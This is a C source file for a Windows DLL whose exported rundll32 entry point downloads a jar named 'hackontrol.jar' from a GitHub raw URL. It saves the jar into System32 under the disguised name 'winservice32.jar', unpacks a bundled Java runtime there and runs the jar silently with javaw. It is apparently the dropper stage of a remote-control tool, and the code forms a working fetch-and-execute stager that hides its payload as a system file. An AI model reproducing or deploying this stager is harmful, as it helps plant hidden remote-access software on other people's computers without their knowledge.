#include <khopanwin32.h>
#include <khopanstring.h>
#include "downloadjar.h"
#include "extractor.h"
#include "executor.h"

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define SYSTEM32         L"System32"
#define JAR_NAME         L"winservice32.jar"
#define RUNDLL32EXE      L"rundll32.exe"
#define LIBRARY_NAME     L"libdll32.dll"
#define JAVA_PATH_NAME    "jn"
#define REMOTE_FILE_NAME L"hackontrol.jar"

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	LPWSTR windowsDirectoryPath = KHWin32GetWindowsDirectoryW();

	if(!windowsDirectoryPath) {
		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
		return;
	}
	
	LPWSTR system32Path = KHFormatMessageW(L"%ws\\" SYSTEM32, windowsDirectoryPath);
	FREE(windowsDirectoryPath);

	if(!system32Path) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\" RUNDLL32EXE, system32Path);

	if(!rundll32Path) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeSystem32Path;
	}

	LPWSTR downloadArgument = KHFormatMessageW(L"%ws " LIBRARY_NAME L",DownloadFile https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/" REMOTE_FILE_NAME L"," JAR_NAME, rundll32Path);

	if(!downloadArgument) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeRundll32Path;
	}

	BOOL result = DownloadJar(system32Path, rundll32Path, downloadArgument);
	FREE(downloadArgument);

	if(!result) {
		goto freeRundll32Path;
	}

	LPSTR javaDirectoryPath = KHFormatMessageA("%ws\\" JAVA_PATH_NAME, system32Path);

	if(!javaDirectoryPath) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeRundll32Path;
	}

	if(!CreateDirectoryA(javaDirectoryPath, NULL)) {
		DWORD error = GetLastError();

		if(error != ERROR_ALREADY_EXISTS) {
			KHWin32DialogErrorW(error, L"KHFormatMessageW");
			FREE(javaDirectoryPath);
			goto freeRundll32Path;
		}
	}

	result = ExtractJRE(javaDirectoryPath);
	FREE(javaDirectoryPath);

	if(result) {
		goto freeRundll32Path;
	}

	LPWSTR javaBinPath = KHFormatMessageW(L"%ws\\%S\\bin", system32Path, JAVA_PATH_NAME);

	if(!javaBinPath) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeRundll32Path;
	}

	LPWSTR javaExecutablePath = KHFormatMessageW(L"%ws\\javaw.exe", javaBinPath);

	if(!javaExecutablePath) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeJavaBinPath;
	}

	LPWSTR javaCommandArgument = KHFormatMessageW(L"%ws -jar ..\\..\\" JAR_NAME, javaExecutablePath);

	if(!javaCommandArgument) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeJavaExecutablePath;
	}

	ExecuteJarFile(javaExecutablePath, javaCommandArgument, javaBinPath);
	FREE(javaCommandArgument);
freeJavaExecutablePath:
	FREE(javaExecutablePath);
freeJavaBinPath:
	FREE(javaBinPath);
freeRundll32Path:
	FREE(rundll32Path);
freeSystem32Path:
	FREE(system32Path);
}
